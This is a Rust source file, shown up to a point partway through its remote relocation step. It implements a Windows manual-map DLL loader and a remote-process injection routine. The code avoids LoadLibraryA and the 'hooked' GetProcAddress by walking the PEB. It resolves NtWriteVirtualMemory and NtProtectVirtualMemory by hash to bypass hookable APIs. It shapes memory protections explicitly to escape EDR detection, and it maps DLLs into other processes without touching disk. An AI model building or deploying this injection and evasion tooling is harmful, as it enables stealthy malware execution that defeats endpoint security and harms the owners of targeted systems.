//! Manual map PE loader for Windows.
#![cfg(windows)]

use anyhow::{anyhow, Result};
use goblin::pe::PE;
use std::collections::HashMap;
// Use winapi's c_void throughout to avoid type mismatches with winapi return values.
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{LIST_ENTRY, UNICODE_STRING};
use winapi::um::memoryapi::{
    VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect, VirtualProtectEx,
    WriteProcessMemory, ReadProcessMemory,
};
use winapi::um::winnt::{
    DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
    IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
    IMAGE_SCN_MEM_WRITE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
    PROCESS_ALL_ACCESS,
};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use pe_resolve;


// RUNTIME_FUNCTION (IMAGE_RUNTIME_FUNCTION_ENTRY) – 12 bytes, x64 only.
#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct RuntimeFunction {
    begin_address: u32,
    end_address: u32,
    unwind_info_address: u32,
}

#[cfg(target_arch = "x86_64")]
extern "system" {
    /// Registers a dynamic function table so the OS can unwind exceptions
    /// inside memory-mapped code.  Declared here because winapi 0.3 does not
    /// expose it at a stable path.
    fn RtlAddFunctionTable(
        function_table: *const RuntimeFunction,
        entry_count: u32,
        base_address: u64,
    ) -> u8; // BOOLEAN
}

// 1. Defining PEB and LDR structures to walk PEB

#[repr(C)]
struct PEB {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8,
    BitFields: u8,
    Mutant: *mut c_void,
    ImageBaseAddress: *mut c_void,
    Ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct PEB_LDR_DATA {
    Length: u32,
    Initialized: u8,
    SsHandle: *mut c_void,
    InLoadOrderModuleList: LIST_ENTRY,
    InMemoryOrderModuleList: LIST_ENTRY,
    InInitializationOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    InLoadOrderLinks: LIST_ENTRY,
    InMemoryOrderLinks: LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase: *mut c_void,
    EntryPoint: *mut c_void,
    SizeOfImage: u32,
    FullDllName: UNICODE_STRING,
    BaseDllName: UNICODE_STRING,
}

/// Load a module using LdrLoadDll resolved via PEB walk — avoids LoadLibraryA.
unsafe fn load_via_ldr(module_name: &str) -> *mut c_void {
    // Resolve LdrLoadDll from the already-loaded ntdll via PEB walk.
    let ntdll = get_module_handle_peb("ntdll.dll");
    if ntdll.is_null() {
        return std::ptr::null_mut();
    }
    let ldr_load_dll_ptr = get_proc_address_manual(ntdll, "LdrLoadDll");
    if ldr_load_dll_ptr.is_null() {
        return std::ptr::null_mut();
    }

    type LdrLoadDllFn = unsafe extern "system" fn(
        search_path: *const u16,
        dll_characteristics: *const u32,
        module_name: *const winapi::shared::ntdef::UNICODE_STRING,
        base_address: *mut *mut c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_load_dll_ptr);

    // Build a UNICODE_STRING for the module name.
    let mut wide: Vec<u16> = module_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let mut us = winapi::shared::ntdef::UNICODE_STRING {
        Length: ((wide.len() - 1) * 2) as u16,
        MaximumLength: (wide.len() * 2) as u16,
        Buffer: wide.as_mut_ptr(),
    };

    let mut base: *mut c_void = std::ptr::null_mut();
    let status = ldr_load_dll(std::ptr::null(), std::ptr::null(), &us, &mut base);
    if status < 0 {
        std::ptr::null_mut()
    } else {
        base
    }
}

unsafe fn get_module_handle_peb(module_name: &str) -> *mut c_void {
    #[cfg(target_arch = "x86_64")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) p);
        p as *mut PEB
    };

    #[cfg(target_arch = "x86")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, fs:[0x30]", out(reg) p);
        p as *mut PEB
    };

    if peb.is_null() || (*peb).Ldr.is_null() {
        return std::ptr::null_mut();
    }

    let ldr = (*peb).Ldr;
    let list_head = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
    let mut current = (*list_head).Flink;

    let name_lower = module_name.to_lowercase();
    let name_no_ext = name_lower.trim_end_matches(".dll");

    while current != list_head && !current.is_null() {
        let entry = current as *mut LDR_DATA_TABLE_ENTRY;
        let base_dll_name = &(*entry).BaseDllName;

        if base_dll_name.Length > 0 && !base_dll_name.Buffer.is_null() {
            let slice = std::slice::from_raw_parts(
                base_dll_name.Buffer,
                (base_dll_name.Length / 2) as usize,
            );
            if let Ok(name) = String::from_utf16(slice) {
                let n = name.to_lowercase();
                if n == name_lower || n.trim_end_matches(".dll") == name_no_ext {
                    return (*entry).DllBase;
                }
            }
        }
        current = (*current).Flink;
    }
    std::ptr::null_mut()
}

unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut c_void {
    // Bounded recursion guard: forwarded exports can chain across modules
    // (kernel32!HeapAlloc -> ntdll!RtlAllocateHeap -> ...).  A pathological
    // or malicious export table could form a cycle; cap the depth.
    thread_local! {
        static FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }
    const MAX_FORWARDER_DEPTH: u32 = 8;
    let depth = FORWARDER_DEPTH.with(|c| c.get());
    if depth >= MAX_FORWARDER_DEPTH {
        return std::ptr::null_mut();
    }
    FORWARDER_DEPTH.with(|c| c.set(depth + 1));
    struct DepthGuard;
    impl Drop for DepthGuard {
        fn drop(&mut self) {
            FORWARDER_DEPTH.with(|c| c.set(c.get().saturating_sub(1)));
        }
    }
    let _g = DepthGuard;

    if module.is_null() {
        return std::ptr::null_mut();
    }
    let base = module as *const u8;
    let dos_header = &*(base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }

    let e_lfanew = dos_header.e_lfanew as usize;

    #[cfg(target_arch = "x86")]
    use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "x86_64")]
    use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

    let nt_headers = &*(base.add(e_lfanew) as *const IMAGE_NT_HEADERS);
    if nt_headers.Signature != 0x4550 {
        return std::ptr::null_mut();
    }

    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_dir_size =
        nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
    if export_dir_rva == 0 {
        // No export directory — cannot resolve this function manually.
        return std::ptr::null_mut();
    }

    let export_dir = &*(base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    let names = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfNames as usize) as *const u32,
        export_dir.NumberOfNames as usize,
    );
    let funcs = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfFunctions as usize) as *const u32,
        export_dir.NumberOfFunctions as usize,
    );
    let ords = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfNameOrdinals as usize) as *const u16,
        export_dir.NumberOfNames as usize,
    );

    for i in 0..export_dir.NumberOfNames as usize {
        let name_rva = names[i];
        let name_ptr = base.add(name_rva as usize) as *const u8;
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_slice = std::slice::from_raw_parts(name_ptr, len);
        if let Ok(n) = std::str::from_utf8(name_slice) {
            if n == proc_name {
                let func_rva = funcs[ords[i] as usize];
                if func_rva != 0 {
                    let addr = base.add(func_rva as usize) as *mut c_void;
                    if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
                        // Forwarded export: bytes at func_rva are a null-terminated ASCII
                        // string of the form "ModuleName.FunctionName".
                        let fwd_ptr = base.add(func_rva as usize) as *const u8;
                        let mut fwd_len = 0;
                        while *fwd_ptr.add(fwd_len) != 0 {
                            fwd_len += 1;
                        }
                        let fwd_slice = std::slice::from_raw_parts(fwd_ptr, fwd_len);
                        if let Ok(fwd_str) = std::str::from_utf8(fwd_slice) {
                            if let Some(dot) = fwd_str.find('.') {
                                let target_mod = &fwd_str[..dot];
                                let target_fn = &fwd_str[dot + 1..];
                                // Try PEB walk first, then fall back to a ntdll-direct load.
                                let mut mod_handle = get_module_handle_peb(target_mod);
                                if mod_handle.is_null() {
                                    mod_handle = load_via_ldr(target_mod);
                                }
                                if !mod_handle.is_null() {
                                    return get_proc_address_manual(mod_handle, target_fn);
                                }
                            }
                        }
                        return std::ptr::null_mut();
                    }
                    return addr;
                }
            }
        }
    }

    // Function not found in the export table — return null rather than
    // calling the hooked Win32 GetProcAddress.
    std::ptr::null_mut()
}

pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
    let pe = PE::parse(dll_bytes)?;
    let optional_header = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    // 1. Allocate memory for the DLL
    let image_base = VirtualAlloc(
        std::ptr::null_mut(),
        optional_header.windows_fields.size_of_image as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if image_base.is_null() {
        return Err(anyhow!("VirtualAlloc failed"));
    }

    struct AllocGuard {
        ptr: *mut c_void,
        success: bool,
    }
    impl Drop for AllocGuard {
        fn drop(&mut self) {
            if !self.success {
                unsafe {
                    VirtualFree(self.ptr, 0, MEM_RELEASE);
                }
            }
        }
    }
    let mut _guard = AllocGuard {
        ptr: image_base,
        success: false,
    };

    // 1b. Copy PE headers (DOS header, NT headers, section table) so that
    //     DLLs which inspect their own headers at runtime (resource lookup,
    //     TLS callbacks, etc.) find the expected data rather than zeroed memory.
    let size_of_headers = optional_header.windows_fields.size_of_headers as usize;
    std::ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        image_base as *mut u8,
        size_of_headers.min(dll_bytes.len()),
    );

    // 2. Copy sections
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        if raw_offset.saturating_add(raw_size) > dll_bytes.len() {
            return Err(anyhow!(
                "PE section data (offset {:#x} + size {:#x}) exceeds DLL buffer length {}; PE is corrupt",
                raw_offset,
                raw_size,
                dll_bytes.len()
            ));
        }
        let dest = image_base.add(section.virtual_address as usize);
        let src = dll_bytes.as_ptr().add(raw_offset);
        std::ptr::copy_nonoverlapping(src, dest as *mut u8, raw_size);
    }

    // 3. Process imports
    let mut loaded_modules: HashMap<&str, *mut c_void> = HashMap::new();
    for import in &pe.imports {
        let dll_name = import.dll;
        if !loaded_modules.contains_key(dll_name) {
            let mut handle = get_module_handle_peb(dll_name);
            if handle.is_null() {
                handle = load_via_ldr(dll_name);
                if handle.is_null() {
                    return Err(anyhow!("Failed to load dependent module {}", dll_name));
                }
            }
            loaded_modules.insert(dll_name, handle);
        }
        let module_handle = *loaded_modules.get(dll_name).unwrap();
        let proc_addr = get_proc_address_manual(module_handle, &import.name);
        if proc_addr.is_null() {
            return Err(anyhow!("Failed to resolve function {}", import.name));
        }
        let thunk_ref = image_base.add(import.rva);
        *(thunk_ref as *mut usize) = proc_addr as usize;
    }

    // 4. Apply base relocations
    let preferred_base = optional_header.windows_fields.image_base as isize;
    let base_delta = image_base as isize - preferred_base;
    if base_delta != 0 {
        if let Some(reloc_entry) = optional_header.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
        {
            if reloc_entry.virtual_address != 0 && reloc_entry.size > 0 {
                let reloc_size = reloc_entry.size as usize;
                let block_rva = reloc_entry.virtual_address as usize;
                // Snapshot the entire relocation directory into a local buffer
                // *before* applying any patches.  Without this, a relocation
                // entry whose target falls inside the .reloc section itself
                // (or whose patch happens to overlap the next block header due
                // to merged/overlapping sections) could rewrite the headers we
                // are about to read on the next iteration, leading to
                // unpredictable behaviour.  Reading from a pristine copy makes
                // the iteration deterministic.
                let reloc_data: Vec<u8> =
                    std::slice::from_raw_parts(image_base.add(block_rva) as *const u8, reloc_size)
                        .to_vec();

                let mut offset = 0usize;
                while offset + 8 <= reloc_size {
                    let page_rva =
                        u32::from_le_bytes(reloc_data[offset..offset + 4].try_into().unwrap())
                            as usize;
                    let block_size =
                        u32::from_le_bytes(reloc_data[offset + 4..offset + 8].try_into().unwrap())
                            as usize;
                    if block_size < 8 || offset + block_size > reloc_size {
                        break;
                    }
                    let entries_count = (block_size - 8) / 2;
                    let entries_start = offset + 8;
                    for i in 0..entries_count {
                        let off = entries_start + i * 2;
                        let entry =
                            u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                        let reloc_type = (entry >> 12) as u8;
                        let reloc_offset = (entry & 0x0FFF) as usize;
                        if reloc_type == 10 {
                            // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                            let addr = image_base.add(page_rva + reloc_offset) as *mut isize;
                            *addr += base_delta;
                        } else if reloc_type == 3 {
                            // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86, ARM32)
                            let addr = image_base.add(page_rva + reloc_offset) as *mut i32;
                            *addr = (*addr as isize + base_delta) as i32;
                        } else if reloc_type == 5 || reloc_type == 7 {
                            // IMAGE_REL_BASED_ARM_MOV32 (5) / IMAGE_REL_BASED_THUMB_MOV32 (7):
                            // A MOVW + MOVT instruction pair encodes a 32-bit absolute VA.
                            // ARM32 instruction encoding (ARM_MOV32, type 5):
                            //   bits[19:16] = imm4, bits[11:0] = imm12  → imm16 = (imm4<<12)|imm12
                            // Thumb-2 T3 encoding (THUMB_MOV32, type 7):
                            //   upper word: bits[19:16]=imm4, bit[26]=i
                            //   lower word: bits[14:12]=imm3, bits[7:0]=imm8 → imm16 = (imm4<<12)|(i<<11)|(imm3<<8)|imm8
                            let is_thumb = reloc_type == 7;
                            let movw_ptr = image_base.add(page_rva + reloc_offset) as *mut u32;
                            let movt_ptr = movw_ptr.add(1);
                            let movw = u32::from_le(*movw_ptr);
                            let movt = u32::from_le(*movt_ptr);
                            let (lo16, hi16) = if is_thumb {
                                let extract_t = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let i = ((v >> 26) & 0x1) as u16;
                                    let imm3 = ((v >> 12) & 0x7) as u16;
                                    let imm8 = (v & 0xFF) as u16;
                                    (imm4 << 12) | (i << 11) | (imm3 << 8) | imm8
                                };
                                (extract_t(movw), extract_t(movt))
                            } else {
                                let extract_a = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let imm12 = (v & 0xFFF) as u16;
                                    (imm4 << 12) | imm12
                                };
                                (extract_a(movw), extract_a(movt))
                            };
                            let orig_va = (lo16 as u32) | ((hi16 as u32) << 16);
                            let new_va = ((orig_va as isize).wrapping_add(base_delta)) as u32;
                            let new_lo = (new_va & 0xFFFF) as u16;
                            let new_hi = (new_va >> 16) as u16;
                            if is_thumb {
                                let patch_t = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let i = ((val >> 11) & 0x1) as u32;
                                    let imm3 = ((val >> 8) & 0x7) as u32;
                                    let imm8 = (val & 0xFF) as u32;
                                    (v & !((0xF << 16) | (1 << 26) | (0x7 << 12) | 0xFF))
                                        | (imm4 << 16)
                                        | (i << 26)
                                        | (imm3 << 12)
                                        | imm8
                                };
                                *movw_ptr = patch_t(movw, new_lo).to_le();
                                *movt_ptr = patch_t(movt, new_hi).to_le();
                            } else {
                                let patch_a = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let imm12 = (val & 0xFFF) as u32;
                                    (v & !((0xF << 16) | 0xFFF)) | (imm4 << 16) | imm12
                                };
                                *movw_ptr = patch_a(movw, new_lo).to_le();
                                *movt_ptr = patch_a(movt, new_hi).to_le();
                            }
                        } else if reloc_type == 11 || reloc_type == 12 || reloc_type == 13 {
                            // ARM64 PC-relative entries (ADRP / ADD page-offset / LDR page-offset):
                            // these are self-relative and require no patch for a uniform image rebase
                            // because both the instruction's page and its target move by the same delta.
                        } else if reloc_type != 0 {
                            // Type 0 = IMAGE_REL_BASED_ABSOLUTE — padding, no action.
                            // Anything else is an unrecognised type; log at debug level so callers
                            // can diagnose partial-relocation issues without crashing.
                            #[cfg(debug_assertions)]
                            tracing::debug!(
                                "manual_map: skipping unhandled relocation type {} at rva+offset {:#x}",
                                reloc_type, page_rva + reloc_offset
                            );
                        }
                    }
                    offset += block_size;
                }
            }
        }
    }

    // 4b. Invoke TLS callbacks (if any) before calling DllMain.
    //
    // Some DLLs compiled with MSVC __declspec(thread) register one or more
    // PIMAGE_TLS_CALLBACK functions in the TLS directory (data directory 9).
    // The loader must call every callback in the null-terminated array with
    // (DllHandle, DLL_PROCESS_ATTACH, Reserved=0) before the entry point.
    //
    // IMAGE_DIRECTORY_ENTRY_TLS = 9
    const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
    if let Some(tls_entry) =
        optional_header.data_directories.data_directories[IMAGE_DIRECTORY_ENTRY_TLS]
    {
        if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
            // The TLS directory layout (pointer-width fields match the target):
            //   StartAddressOfRawData  : usize
            //   EndAddressOfRawData    : usize
            //   AddressOfIndex         : usize
            //   AddressOfCallBacks     : usize  ← VA of null-terminated callback array
            //   SizeOfZeroFill         : u32
            //   Characteristics        : u32
            #[repr(C)]
            struct ImageTlsDirectory {
                _start_address_of_raw_data: usize,
                _end_address_of_raw_data: usize,
                _address_of_index: usize,
                address_of_callbacks: usize,
                _size_of_zero_fill: u32,
                _characteristics: u32,
            }
            let tls_dir =
                &*(image_base.add(tls_entry.virtual_address as usize) as *const ImageTlsDirectory);
            if tls_dir.address_of_callbacks != 0 {
                // address_of_callbacks is a VA pointing into our mapped image;
                // after relocation it already reflects the allocation address.
                let image_size = optional_header.windows_fields.size_of_image as usize;
                let image_start = image_base as usize;
                let image_end = image_start.saturating_add(image_size);
                let mut cb_ptr = tls_dir.address_of_callbacks as *const usize;
                // Defensive cap: TLS callback arrays are typically a handful of
                // entries; refuse to follow more than 32 to bound runaway loops.
                let mut remaining = 32u32;
                loop {
                    if remaining == 0 {
                        break;
                    }
                    remaining -= 1;
                    // Validate that the callback-array slot itself is inside the image.
                    let slot = cb_ptr as usize;
                    if slot < image_start
                        || slot.saturating_add(std::mem::size_of::<usize>()) > image_end
                    {
                        break;
                    }
                    let cb_va = *cb_ptr;
                    if cb_va == 0 {
                        break;
                    }
                    // Validate that the callback target is inside the image we just
                    // mapped — refuse to dispatch to anything outside it.
                    if cb_va < image_start || cb_va >= image_end {
                        break;
                    }
                    let callback: unsafe extern "system" fn(*mut c_void, u32, *mut c_void) =
                        std::mem::transmute(cb_va);
                    callback(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut());
                    cb_ptr = cb_ptr.add(1);
                }
            }
        }
    }

    // 5. Set memory protections
    for section in &pe.sections {
        // PAGE_* constants are mutually exclusive — never OR them together.
        // Map (exec, read, write) characteristic flags to the single PAGE_*
        // value that best approximates the requested protection.
        let exec = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = section.characteristics & IMAGE_SCN_MEM_READ != 0;
        let write = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let prot: u32 = match (exec, read, write) {
            // Downgrade W+X to PAGE_EXECUTE_READ.  No legitimate section
            // needs RWX at load time; RWX pages are a major EDR detection
            // signal.  If a section's own code needs temporary write access
            // after load it should call VirtualProtect itself.
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };
        let mut old_prot = 0;
        // Use the larger of virtual_size and size_of_raw_data: a linker may
        // set VirtualSize to 0 (optimisation), which would make VirtualProtect
        // a no-op and leave the section with the wrong permissions.
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        VirtualProtect(
            image_base.add(section.virtual_address as usize),
            prot_size,
            prot,
            &mut old_prot,
        );
    }

    // 5b. Register the .pdata section (exception handling directory) so the OS
    //     can correctly unwind the stack for exceptions thrown inside the DLL.
    //     Without this, any C++ try/catch or SEH block in the DLL terminates
    //     the process instead of propagating to a handler.
    #[cfg(target_arch = "x86_64")]
    {
        for section in &pe.sections {
            // Section names are a fixed 8-byte array; trim null bytes for comparison.
            let end = section.name.iter().position(|&b| b == 0).unwrap_or(8);
            if &section.name[..end] == b".pdata" && section.size_of_raw_data > 0 {
                let pdata_ptr =
                    image_base.add(section.virtual_address as usize) as *const RuntimeFunction;
                // Each RUNTIME_FUNCTION entry is exactly 12 bytes.
                let entry_count = (section.size_of_raw_data as usize / 12) as u32;
                if entry_count > 0 {
                    RtlAddFunctionTable(pdata_ptr, entry_count, image_base as u64);
                }
                break;
            }
        }
    }

    // 6. Call entry point
    let entry_point_addr =
        image_base.add(optional_header.standard_fields.address_of_entry_point as usize);
    let entry_point: extern "system" fn(*mut c_void, u32, *mut c_void) -> bool =
        std::mem::transmute(entry_point_addr);
    if !entry_point(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut()) {
        return Err(anyhow!("DLL entry point failed"));
    }

    _guard.success = true;
    Ok(image_base)
}

// ── Remote manual-map injection ──────────────────────────────────────────────

/// Map a PE DLL into a remote process without writing any file to disk.
///
/// # What this does
///
/// 1. **Allocates** a region in the target process large enough for the
///    complete mapped image (`VirtualAllocEx`).
/// 2. **Copies** the PE headers and each raw section into the remote region
///    with `WriteProcessMemory`.
/// 3. **Applies base relocations** for the remote allocation address
///    (all arithmetic is done in local memory, then the patched words are
///    written into the remote image).
/// 4. **Resolves the Import Address Table** using the Win32 `GetModuleHandleA`
///    / `GetProcAddress` pair.  On Windows, NTDLL and kernel32 are mapped at
///    the same base address in every process (per-boot ASLR, shared between
///    all processes via copy-on-write), so the resolved function addresses are
///    correct for the remote process.
/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` (resolved via PEB walk).
///    fire-and-forget: the returned thread handle is closed immediately after
///    creation.
///
/// # Arguments
///
/// * `target_process` — A `HANDLE` with at least `PROCESS_VM_OPERATION |
///   PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` access rights.  The caller is
///   responsible for opening and closing the handle.
/// * `dll_bytes` — The raw PE DLL bytes to inject (in-memory, not a path).
///
/// # Returns
///
/// The virtual address of the remote image base on success.
pub unsafe fn load_dll_in_remote_process(
    target_process: winapi::um::winnt::HANDLE,
    dll_bytes: &[u8],
) -> Result<*mut c_void> {
    type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
        process_handle: winapi::um::winnt::HANDLE,
        base_address: *mut c_void,
        buffer: *const c_void,
        bytes_to_write: usize,
        bytes_written: *mut usize,
    ) -> i32;
    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
        process_handle: winapi::um::winnt::HANDLE,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32;

    let pe = PE::parse(dll_bytes)?;
    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    let image_size = opt.windows_fields.size_of_image as usize;
    let preferred_base = opt.windows_fields.image_base as isize;

    // ── Step 1: allocate in the remote process ────────────────────────────
    let remote_base = VirtualAllocEx(
        target_process,
        std::ptr::null_mut(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE, // RW initially; per-section protections applied after sections are written
    );
    if remote_base.is_null() {
        return Err(anyhow!(
            "VirtualAllocEx failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Resolve NtWriteVirtualMemory/NtProtectVirtualMemory via clean export-walk
    // so remote image writes/protection flips do not go through hookable APIs.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
        .ok_or_else(|| anyhow!("remote_manual_map: ntdll not found via PEB walk"))?;

    let nt_write_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
        ntdll_base,
        pe_resolve::hash_str(b"NtWriteVirtualMemory\0"),
    )
    .ok_or_else(|| anyhow!("remote_manual_map: NtWriteVirtualMemory not found"))?;

    let nt_protect_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
        ntdll_base,
        pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
    )
    .ok_or_else(|| anyhow!("remote_manual_map: NtProtectVirtualMemory not found"))?;

    let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
        std::mem::transmute(nt_write_virtual_memory_addr as *const ());
    let nt_protect_virtual_memory: NtProtectVirtualMemoryFn =
        std::mem::transmute(nt_protect_virtual_memory_addr as *const ());

    let protect_remote =
        |base: &mut *mut c_void, size: &mut usize, prot: u32, old: &mut u32| -> Result<()> {
            let status = nt_protect_virtual_memory(target_process, base, size, prot, old);
            if status < 0 {
                return Err(anyhow!(
                    "NtProtectVirtualMemory failed (status={status:#x})"
                ));
            }
            Ok(())
        };

    // Helper: write a local buffer slice into the remote process at an offset
    // from remote_base. Temporarily flips target pages to RW for the write and
    // restores their prior protection immediately afterward.
    let write_remote = |rva: usize, data: &[u8]| -> Result<()> {
        if data.is_empty() {
            return Ok(());
        }
        let dest = (remote_base as usize + rva) as *mut c_void;

        let mut prot_base = dest;
        let mut prot_size = data.len();
        let mut old_prot = 0u32;
        protect_remote(&mut prot_base, &mut prot_size, PAGE_READWRITE, &mut old_prot)?;

        let mut written = 0usize;
        let status = nt_write_virtual_memory(
            target_process,
            dest,
            data.as_ptr() as *const c_void,
            data.len(),
            &mut written,
        );

        let mut restore_dummy = 0u32;
        // Restore original protection even if the write failed.
        let _ = protect_remote(
            &mut prot_base,
            &mut prot_size,
            old_prot,
            &mut restore_dummy,
        );

        if status < 0 || written != data.len() {
            return Err(anyhow!(
                "NtWriteVirtualMemory failed at rva {rva:#x} (status={status:#x}, written={written:#x}, expected={:#x})",
                data.len()
            ));
        }
        Ok(())
    };

    // ── Step 2: copy PE headers ────────────────────────────────────────────
    let header_size = opt.windows_fields.size_of_headers as usize;
    write_remote(0, &dll_bytes[..header_size.min(dll_bytes.len())])?;

    // ── Step 3: copy sections ──────────────────────────────────────────────
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        if raw_offset.saturating_add(raw_size) > dll_bytes.len() {
            return Err(anyhow!(
                "section at raw offset {raw_offset:#x}+{raw_size:#x} exceeds dll_bytes length"
            ));
        }
        let section_data = &dll_bytes[raw_offset..raw_offset + raw_size];
        write_remote(section.virtual_address as usize, section_data)?;
    }

    // ── Step 3b: apply per-section memory protections ─────────────────────
    // The allocation was made as PAGE_READWRITE so we could write sections.
    // Now apply the same per-section policy as the local variant so sections
    // are never left RWX.  W+X is downgraded to RX; later write operations
    // temporarily re-enable RW via NtProtectVirtualMemory.
    for section in &pe.sections {
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        if prot_size == 0 {
            continue;
        }
        let rva = section.virtual_address as usize;
        let ch = section.characteristics;
        let exec = ch & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = ch & IMAGE_SCN_MEM_READ != 0;
        let write = ch & IMAGE_SCN_MEM_WRITE != 0;
        let protect = match (exec, read, write) {
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };

        let mut target = (remote_base as usize + rva) as *mut c_void;
        let mut size = prot_size;
        let mut old = 0u32;
        protect_remote(&mut target, &mut size, protect, &mut old)?;
    }

    // ── Step 4a: compute and apply base relocations ────────────────────────
    // All patches are computed in a local buffer then written remotely.
    let base_delta = remote_base as isize - preferred_base;
    if base_delta != 0 {
        if let Some(reloc_dir) = opt.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
        {
            if reloc_dir.virtual_address != 0 && reloc_dir.size > 0 {
                let reloc_rva = reloc_dir.virtual_address as usize;
                let reloc_size = reloc_dir.size as usize;

                // Read the relocation directory from the remote image.
                let mut reloc_data = vec![0u8; reloc_size];
                let mut bytes_read = 0usize;
                let ok = ReadProcessMemory(
                    target_process,
                    (remote_base as usize + reloc_rva) as *const c_void,
                    reloc_data.as_mut_ptr() as *mut c_void,
                    reloc_size,
                    &mut bytes_read,
                );
                if ok == 0 || bytes_read != reloc_size {
                    return Err(anyhow!(
                        "ReadProcessMemory for reloc directory failed: {}",
                        std::io::Error::last_os_error()
                    ));
                }

                let mut offset = 0usize;
                while offset + 8 <= reloc_size {
                    let page_rva = u32::from_le_bytes(
                        reloc_data[offset..offset + 4].try_into().unwrap(),
                    ) as usize;
                    let block_size = u32::from_le_bytes(
                        reloc_data[offset + 4..offset + 8].try_into().unwrap(),
                    ) as usize;
